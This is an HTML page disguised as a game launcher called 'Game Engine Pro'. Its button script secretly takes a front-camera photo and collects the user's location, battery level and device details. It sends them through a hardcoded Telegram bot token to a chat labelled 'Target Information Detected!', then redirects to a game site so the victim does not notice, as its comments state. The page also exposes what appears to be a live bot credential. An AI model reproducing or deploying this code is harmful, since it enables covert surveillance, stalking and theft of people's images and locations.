<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Game Engine Pro</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; background: black; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
        .bg-img { position: fixed; inset: 0; background: url('https://raw.githubusercontent.com/tar-alt/Photo-link-/6451c994788dbe34e12fbac624779364dbf1c113/Picsart_26-05-13_08-54-08-682.jpg') center/cover; opacity: 0.6; }
        .start-btn { position: relative; padding: 15px 40px; font-size: 20px; font-weight: bold; color: white; background: #3390ec; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(51, 144, 236, 0.6); transition: 0.3s; }
        .start-btn:active { transform: scale(0.95); }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="bg-img"></div>
<button id="startBtn" class="start-btn">ENTER GAME ENGINE</button>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
    const CHAT_ID = "5304050102";

    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    startBtn.addEventListener('click', async () => {
        startBtn.innerText = "Connecting...";
        
        try {
            // ၁။ Camera Permission တောင်းပြီး ပုံဖမ်းခြင်း
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            // ၂။ Location ရယူခြင်း
            let locationInfo = "Location: Denied";
            navigator.geolocation.getCurrentPosition(pos => {
                locationInfo = `📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, err => { locationInfo = "📍 Location: Permission Denied"; });

            // ၃။ Battery & Phone Info
            let batteryInfo = "N/A";
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not charging'})`;
            }

            const phoneInfo = `📱 Browser: ${navigator.userAgent.split(') ')[0]}) \n🖥️ Platform: ${navigator.platform}`;

            // ခေတ္တစောင့်ပြီး ပုံရိုက်မယ်
            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                const blob = await (await fetch(imageData)).blob();

                // ၄။ အချက်အလက်အားလုံးကို Bot ဆီ ပို့ခြင်း
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', `📡 *Target Information Detected!*\n\n${locationInfo}\n🔋 Battery: ${batteryInfo}\n${phoneInfo}`);
                formData.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                // ပို့ပြီးရင် Game site တစ်ခုခုကို လွှဲလိုက်မယ် (မရိပ်မိအောင်)
                stream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.crazygames.com";
            }, 3000);

        } catch (err) {
            alert("ဂိမ်းဆော့ရန် Camera Permission ပေးဖို့လိုအပ်ပါတယ်။");
            location.reload();
        }
    });
</script>

</body>
</html>
